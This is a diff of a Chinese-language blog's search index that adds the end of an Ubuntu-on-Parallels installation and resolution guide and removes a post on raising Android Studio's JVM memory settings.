+</li>
+<li>
+<p>選擇語言<br>
+<img data-src="https://i.imgur.com/oQNjwG8.png" alt=""></p>
+</li>
+<li>
+<p>選擇「安裝 Ubuntu」（如果想先試用，但不安裝，可以點第一項）<br>
+<img data-src="https://i.imgur.com/0Fs3tId.png" alt=""></p>
+</li>
+<li>
+<p>選擇安裝過程的語言<br>
+<img data-src="https://i.imgur.com/on5qjbI.jpg" alt=""></p>
+</li>
+<li>
+<p>建議全部勾選，也可以選擇自己想要的勾選<br>
+<img data-src="https://i.imgur.com/xMeVUEq.jpg" alt=""></p>
+</li>
+<li>
+<p>如果是在虛擬機中安裝，不需分隔磁碟，直接選第一個，然後按「立即安裝」<br>
+<img data-src="https://i.imgur.com/18mN5pS.jpg" alt=""></p>
+</li>
+<li>
+<p>點擊「繼續」開始安裝<br>
+<img data-src="https://i.imgur.com/2fEiSDD.jpg" alt=""></p>
+</li>
+<li>
+<p>選擇時區<br>
+<img data-src="https://i.imgur.com/vMKPjPe.jpg" alt=""></p>
+</li>
+<li>
+<p>選擇鍵盤排列方試（台灣鍵盤為美式鍵盤）<br>
+<img data-src="https://i.imgur.com/S8Ey4nw.jpg" alt=""></p>
+</li>
+<li>
+<p>輸入使用者帳戶資訊<br>
+<img data-src="https://i.imgur.com/HyVXVes.jpg" alt=""></p>
+</li>
+<li>
+<p>等待安裝並重新開機</p>
+</li>
+</ol>
+<blockquote>
+<p>註：如果重新開機失敗，可以點選下圖的重新啟動<br>
+<img data-src="https://i.imgur.com/UD95Mls.jpg" alt=""></p>
+</blockquote>
+<h2 id="Parellels-解析度調整">Parellels 解析度調整</h2>
+<ol>
+<li>
+<p>重新開機後，點擊 Parallels 上方的操作選單，並點擊安裝 Parallels Tools，依照指示完成安裝。<br>
+<img data-src="https://i.imgur.com/GSC8SsF.jpg" alt=""></p>
+</li>
+<li>
+<p>確認螢幕設定為「縮放」<br>
+<img data-src="https://i.imgur.com/7YMXx9t.jpg" alt=""></p>
+</li>
+<li>
+<p>點擊「系統設定值」的按鈕<br>
+<img data-src="https://i.imgur.com/Cd293Gd.jpg" alt=""></p>
+</li>
+<li>
+<p>點擊「顯示器」<br>
+<img data-src="https://i.imgur.com/vuFY6F5.jpg" alt=""></p>
+</li>
+<li>
+<p>在這裡可以調整螢幕的解析度（Macbook 建議調成 1440x900）<br>
+<img data-src="https://i.imgur.com/S9YBeTE.jpg" alt=""></p>
+</li>
+</ol>
+]]></content>
+  </entry>
+  <entry>
     <title>條件式與迴圈 - Java</title>
     <url>/%E6%A2%9D%E4%BB%B6%E5%BC%8F%E8%88%87%E8%BF%B4%E5%9C%88-Java/</url>
     <content><![CDATA[<p>為了告訴電腦特定條件下該做什麼動作，要使用各種條件式來定義程式執行的流程。</p>
@@ -1609,34 +1637,6 @@ Android 3.0 以下選擇 NotificationCompat
       </categories>
       <tags>
         <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>解決 Android Studio 卡頓的問題</title>
-    <url>/%E8%A7%A3%E6%B1%BAAndroid-Studio%E5%8D%A1%E9%A0%93%E7%9A%84%E5%95%8F%E9%A1%8C/</url>
-    <content><![CDATA[<h2 id="問題描述">問題描述</h2>
-<p>在使用 Macbook Pro 13 2017 開發案子，發現 Android Studio 會常常出現卡頓。</p>
-<a id="more"></a>
-<h2 id="解決辦法">解決辦法</h2>
-<p>上網查了一下，發現不少人都有這種狀況。問題好像是出在 Android Studio 的啟動參數限制了 JVM 獲得足夠的記憶體，導致了運行時只能頻繁的與磁盤交換。<br>
-因此我們要修改一下 Android Studio 的 JVM 參數文件，他的問位置在：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;Applications&#x2F;Android\ Studio.app&#x2F;Contents&#x2F;bin&#x2F;studio.vmoptions</span><br></pre></td></tr></table></figure>
-<p>在我的電腦上，參數預設是：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-Xms256m</span><br><span class="line">-Xmx1280m</span><br><span class="line">-XX:ReservedCodeCacheSize&#x3D;240m</span><br><span class="line">-XX:+UseCompressedOops</span><br></pre></td></tr></table></figure>
-<p>在修改重要設定檔之前，建議先做備份：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;Applications&#x2F;Android\ Studio.app&#x2F;Contents&#x2F;bin&#x2F;</span><br><span class="line">cp studio.vmoptions studio.vmoptions.bak</span><br></pre></td></tr></table></figure>
-<p>以上為 bash 指令，請打開 terminal 輸入。</p>
-<p>第一句是移動到存放 studio.vmoptions 的資料夾底下<br>
-第二句是將 studio.vmoptions 複製一份備份，並將其命名為 studio.vmoptions.bak</p>
-<p>然後修改 studio.vmoptions 成這樣：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-Xms512m</span><br><span class="line">-Xmx2048m</span><br><span class="line">-XX:ReservedCodeCacheSize&#x3D;768m</span><br><span class="line">-XX:+UseCompressedOops</span><br></pre></td></tr></table></figure>
-<p>如果覺得你記憶體足夠大，可以將 <code>-Xmx</code> 後面的數字改更大。我的電腦為記憶體為 8G，因此我設 2048m。</p>
-]]></content>
-      <categories>
-        <category>Android Studio</category>
-      </categories>
-      <tags>
-        <tag>Android Studio</tag>
       </tags>
   </entry>
 </search>
